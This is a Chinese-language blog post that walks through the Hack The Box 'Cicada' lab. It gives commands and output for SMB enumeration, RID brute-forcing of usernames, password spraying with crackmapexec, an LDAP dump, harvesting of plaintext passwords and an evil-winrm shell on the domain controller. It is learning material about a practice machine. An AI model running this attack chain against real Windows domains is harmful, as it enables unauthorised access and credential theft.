@@ -1,0 +1,253 @@
+<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>HTB_CICADA</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
+<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="nmap└─# nmap 10.10.11.35                 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 08:07 EDT
+Nmap scan report for 10.10.11.35
+Host is up (0.43s latency).
+Not shown: 991 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
+</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">HTB_CICADA</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/Windows"><i class="tag post-item-tag">Windows</i></a><a href="/tags/SMB"><i class="tag post-item-tag">SMB</i></a><a href="/tags/%E5%9F%9F"><i class="tag post-item-tag">域</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">HTB_CICADA</h1><time class="has-text-grey" datetime="2024-10-28T12:03:57.000Z">2024-10-28</time><article class="mt-2 post-content"><h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre><code>└─# nmap 10.10.11.35                 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-28 08:07 EDT
+Nmap scan report for 10.10.11.35
+Host is up (0.43s latency).
+Not shown: 991 filtered tcp ports (no-response)
+PORT     STATE SERVICE
+53/tcp   open  domain
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+3269/tcp open  globalcatLDAPssl
+</code></pre>
+<p>发现有139和445，可能是windows,而且有ldap看起来是有域环境在的。</p>
+<p>使用</p>
+<pre><code>nmap -A -O 10.10.11.35
+</code></pre>
+<p>重新扫一下可以确认，就是htb有时候网络拥堵，会比较慢</p>
+<p>smb匿名登录一下：</p>
+<pre><code>smbclient -L ////$ip -U &quot;&quot;
+# smbclient -L -N ////$ip 
+</code></pre>
+<pre><code>Password for [WORKGROUP\]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DEV             Disk      
+        HR              Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+<blockquote>
+<p>GPT：</p>
+<p>在匿名登录 SMB 服务时，通常可以访问一些默认的共享目录，这些目录可能包括：</p>
+<ol>
+<li><strong>IPC$</strong>: 这是一个用于进程间通信的共享，通常对所有用户开放。</li>
+<li><strong>ADMIN$</strong>: 管理共享，通常只对管理员可见，但某些配置可能允许匿名访问。</li>
+<li><strong>C$</strong>: 系统根目录的共享，通常也只对管理员可见，但可能在某些配置下对匿名用户开放。</li>
+<li><strong>NETLOGON</strong>: 存储登录脚本和策略的共享，通常只对域控制器可用。</li>
+<li><strong>SYSVOL</strong>: 存储域控制器的公共文件夹，通常用于存放组策略和登录脚本。</li>
+</ol>
+</blockquote>
+<p>这个<code>DEV</code>和<code>HR</code>应该是后面创建的，可以看看，发现还是上面的回显，有些忘了怎么测试smb了，看看wp：</p>
+<blockquote>
+<p>Checking SMB first using <code>enum4linux</code></p>
+<pre><code>enum4linux $ip
+</code></pre>
+</blockquote>
+<p>运行后看到一个：</p>
+<pre><code>[+] Server 10.10.11.35 allows sessions using username &#39;&#39;, password &#39;&#39;    
+</code></pre>
+<blockquote>
+<p>Using <code>impacket</code> tools and in specific <code>crackmapexec</code> to identify available shares</p>
+<pre><code>poetry run  crackmapexec  smb $ip -u &quot;&quot; -p &quot;&quot; --shares
+</code></pre>
+</blockquote>
+<p>这里poetry属于是pip+venv，我kali报错先不使用这个虚拟环境。</p>
+<pre><code>└─# crackmapexec  smb 10.10.11.35 -u &quot;&quot; -p &quot;&quot; --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\: 
+SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED
+</code></pre>
+<p>这个DC应该是域控，把地址加到hosts先</p>
+<pre><code>echo &quot;10.10.11.35 cicada.htb CICADA-DC.cicada.htb&quot; &gt;&gt; /etc/hosts
+</code></pre>
+<p>查看HR（前面是命令错了）：</p>
+<pre><code>smbclient  //10.10.11.35/HR 
+Password for [WORKGROUP\root]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Mar 14 08:29:09 2024
+  ..                                  D        0  Thu Mar 14 08:21:29 2024
+  Notice from HR.txt                  A     1266  Wed Aug 28 13:31:48 2024
+</code></pre>
+<p>为什么变成两个<code>/</code>有点忘了，之前的博客好像写过，先记着吧。</p>
+<p>使用megt下载这个文件</p>
+<pre><code>cat Notice\ from\ HR.txt 
+
+Dear new hire!
+
+Welcome to Cicada Corp! We&#39;re thrilled to have you join our team. As part of our security protocols, it&#39;s essential that you change your default password to something unique and secure.
+
+Your default password is: Cicada$M6Corpb*@Lp#nZp!8
+
+To change your password:
+
+1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
+2. Once logged in, navigate to your account settings or profile settings section.
+3. Look for the option to change your password. This will be labeled as &quot;Change Password&quot;.
+4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
+5. After changing your password, make sure to save your changes.
+
+Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.
+
+If you encounter any issues or need assistance with changing your password, don&#39;t hesitate to reach out to our support team at support@cicada.htb.
+
+Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!
+
+Best regards,
+Cicada Corp
+</code></pre>
+<p>看到了邮件里的默认密码：Cicada$M6Corpb*@Lp#nZp!8</p>
+<p>爆破一下用户名：</p>
+<pre><code>crackmapexec  smb $ip -u &quot;guest&quot; -p &quot;&quot; --rid-brute
+</code></pre>
+<pre><code>crackmapexec  smb 10.10.11.35 -u &quot;guest&quot; -p &quot;&quot; --rid-brute &gt; username.txt
+</code></pre>
+<p>密码喷洒：(先处理username.txt)</p>
+<pre><code>grep -oP &#39;(?&lt;=CICADA\\)[^ ]+&#39; filename
+
+crackmapexec  smb $ip -u username.txt -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;
+</code></pre>
+<blockquote>
+<p>gtp:</p>
+<p>为了确保能匹配到 <code>emily.oscars</code>，不受后续字符（如括号）影响，你可以使用更灵活的正则表达式。例如，可以使用 <code>.*?</code> 来匹配任意字符，直到遇到括号：</p>
+<pre><code>bash
+
+
+复制代码
+grep -oP &#39;(?&lt;=CICADA\\)[^ ]+&#39; filename
+</code></pre>
+<p>这里的正则表达式解释如下：</p>
+<ul>
+<li><code>(?&lt;=CICADA\\)</code>: 匹配前面是 <code>CICADA\</code> 的位置。</li>
+<li><code>[^ ]+</code>: 匹配一个或多个非空格字符，这样就可以一直匹配到 <code>emily.oscars</code>，直到遇到空格为止。</li>
+</ul>
+<p>这样就可以成功提取到 <code>emily.oscars</code>，无论后面是否有括号或其他内容。</p>
+</blockquote>
+<p>然后可以得到一个账户：</p>
+<p><code>michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</code></p>
+<p>测试一下这个账户的权限：</p>
+<pre><code>crackmapexec  smb $ip -u &quot;michael.wrightson&quot; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares
+</code></pre>
+<pre><code>crackmapexec  smb 10.10.11.35 -u &quot;michael.wrightson&quot; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares
+</code></pre>
+<p>显示timeout，htb的网真的想杀人：</p>
+<pre><code>└─# crackmapexec  smb 10.10.11.35 -u &quot;michael.wrightson&quot; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39; --shares
+SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
+SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: The NETBIOS connection with the remote host timed out.
+</code></pre>
+<p>直接连上去吧：</p>
+<pre><code>smbclient //$ip -U &#39;michael.wrightson&#39;
+</code></pre>
+<p>但是！</p>
+<blockquote>
+<p>└─# smbclient &#x2F;&#x2F;10.10.11.35 -U ‘michael.wrightson’ Password for [WORKGROUP\michael.wrightson]: \10.10.11.35: Not enough ‘&#39; characters in service</p>
+</blockquote>
+<blockquote>
+<p>GPT:</p>
+<p>这个错误通常是由于指定的 SMB 服务路径不正确导致的。在使用 <code>smbclient</code> 时，路径格式应该是 <code>//&lt;主机名&gt;/&lt;共享名&gt;</code>。</p>
+<p>在你的命令中，应该添加共享名。尝试以下命令：</p>
+<pre><code>bash
+
+
+复制代码
+smbclient //10.10.11.35/&lt;共享名&gt; -U &#39;michael.wrightson&#39;
+</code></pre>
+</blockquote>
+<p>但话又说回来~</p>
+<blockquote>
+<p>GPT:</p>
+<p>请将 <code>&lt;共享名&gt;</code> 替换为实际的共享目录名（如 <code>IPC$</code> 或其他共享名称）。如果不确定共享名，可以使用以下命令列出可用共享：</p>
+<pre><code>bash
+
+
+复制代码
+smbclient -L //10.10.11.35 -U &#39;michael.wrightson&#39;
+</code></pre>
+</blockquote>
+<p>没有GPT包一天都学不下去的(T^T)</p>
+<pre><code>└─# smbclient -L //10.10.11.35 -U &#39;michael.wrightson&#39;
+
+Password for [WORKGROUP\michael.wrightson]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        DEV             Disk      
+        HR              Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre>
+<p>有新文件了，瞅一瞅：</p>
+<pre><code>mbclient //10.10.11.35/SYSVOL -U &#39;michael.wrightson&#39;
+Password for [WORKGROUP\michael.wrightson]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Thu Aug 22 13:40:07 2024
+  ..                                  D        0  Thu Mar 14 07:08:56 2024
+  cicada.htb                         Dr        0  Thu Mar 14 07:08:56 2024
+
+                4168447 blocks of size 4096. 414427 blocks available
+smb: \&gt; mget cicada.htb/*
+</code></pre>
+<p>上去了，找不到有用的东西，没什么经验先学习wp怎么做吧：</p>
+<p>使用名为<code>ldapdomaindump</code>的LDAP工具，转储了可以使用实际当前用户权限查询的所有内容</p>
+<pre><code>ldapdomaindump 10.10.11.35 -u &#39;cicada.htb\michael.wrightson&#39; -p &#39;Cicada$M6Corpb*@Lp#nZp!8&#39;
+</code></pre>
+<p>下载了很多domain开头的文件，像是一些日志啥的，先梭哈一下：</p>
+<pre><code>grep password domain* 
+</code></pre>
+<pre><code class="shell">domain_users.html:&lt;tr&gt;&lt;td&gt;David Orelious&lt;/td&gt;&lt;td&gt;David Orelious&lt;/td&gt;&lt;td&gt;david.orelious&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;domain_users_by_group.html#cn_Domain_Users&quot; title=&quot;CN=Domain Users,OU=Group,DC=cicada,DC=htb&quot;&gt;Domain Users&lt;/a&gt;&lt;/td&gt;&lt;td&gt;03/14/24 12:17:29&lt;/td&gt;&lt;td&gt;10/29/24 10:30:00&lt;/td&gt;&lt;td&gt;10/29/24 13:02:29&lt;/td&gt;&lt;td&gt;NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD&lt;/td&gt;&lt;td&gt;03/14/24 12:17:29&lt;/td&gt;&lt;td&gt;&lt;abbr title=&quot;S-1-5-21-917908876-1423158569-3159038727-1108&quot;&gt;1108&lt;/abbr&gt;&lt;/td&gt;&lt;td&gt;Just in case I forget my password is aRt$Lp#7t*VQ!3&lt;/td&gt;&lt;/tr&gt;
+</code></pre>
+<p>舒服了，<code>david.orelious:aRt$Lp#7t*VQ!3</code></p>
+<pre><code>└─# crackmapexec  smb 10.10.11.35 -u &#39;david.orelious&#39; -p &#39;aRt$Lp#7t*VQ!3&#39; --shares
+SMB         10.10.11.35     445    NONE             [*]  x64 (name:) (domain:) (signing:True) (SMBv1:False)
+SMB         10.10.11.35     445    NONE             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+</code></pre>
+<p>习惯就行，手工测试，在DEV找到新凭证<code>emily.oscars:Q!3@Lp#M6b*7t*Vt</code></p>
+<p>这个账户可以访问文件系统，于是：</p>
+<pre><code>evil-winrm -i $ip -u &quot;emily.oscars&quot; -p &#39;Q!3@Lp#M6b*7t*Vt&#39;
+</code></pre>
+<p>可以得到一个shell</p>
+<pre><code>evil-winrm -i 10.10.11.35 -u &quot;emily.oscars&quot; -p &#39;Q!3@Lp#M6b*7t*Vt&#39;
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                                         
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents&gt; 
+</code></pre>
+<p>后续需要下载内网脚本，有点累了内网先就到这里先准备ctf考核，等后续需要研究内网和域渗透的时候再研究这个靶机。</p>
+</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2024/11/05/Vulnhub-Middleware/" title="Vulhub_Middleware"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: Vulhub_Middleware</span></a><a class="button is-default" href="/2024/10/28/HTB-Sightless/" title="HTB_Sightless"><span class="has-text-weight-semibold">Next: HTB_Sightless</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2024</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>
